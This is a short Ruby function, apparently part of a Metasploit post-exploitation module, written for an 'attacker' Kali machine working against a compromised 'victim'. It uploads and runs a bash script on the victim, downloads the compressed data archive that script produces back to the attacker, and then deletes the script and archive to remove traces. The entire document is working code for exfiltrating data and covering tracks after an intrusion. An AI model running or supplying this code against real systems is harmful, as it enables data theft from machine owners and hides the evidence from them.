def run_script(client)
# Define paths for the bash script and backup file
local_script = "/home/kali/Documents/backup.sh"           # Path to bash script on attacker
remote_script = "/tmp/backup.sh"                          # Path to upload script on victim
backup_file = "/tmp/data_backup.tar.gz"                   # Compressed file on victim
local_download_path = "/home/kali/Documents/data_backup.tar.gz" # Path to save backup on attacker

# Step 1: Upload the bash script to the victim machine
print_status("Uploading the backup script to the victim machine...")
if File.exist?(local_script)
  session.fs.file.upload_file(remote_script, local_script)
  print_good("Backup script uploaded successfully.")
else
  print_error("Local backup script does not exist.")
  return
end

# Step 2: Set the script as executable
print_status("Setting execute permissions for the script...")
cmd_exec("chmod +x #{remote_script}")
print_good("Execute permissions set.")

# Step 3: Execute the script on the victim machine
print_status("Executing the backup script on the victim machine...")
output = cmd_exec("bash #{remote_script}")
if output.nil? || output.empty?
  print_error("Failed to execute the script.")
  return
else
  print_good("Backup script executed successfully.")
end

# Step 4: Download the backup file
print_status("Downloading the backup file to the attacker machine...")
if session.fs.file.exist?(backup_file)
  session.fs.file.download_file(local_download_path, backup_file)
  print_good("Backup file downloaded successfully to #{local_download_path}")
else
  print_error("Backup file not found on the victim machine.")
  return
end

# Step 5: Clean up the victim machine
print_status("Cleaning up temporary files on the victim machine...")
cmd_exec("rm -f #{remote_script} #{backup_file}")
print_good("Temporary files cleaned up.")
end
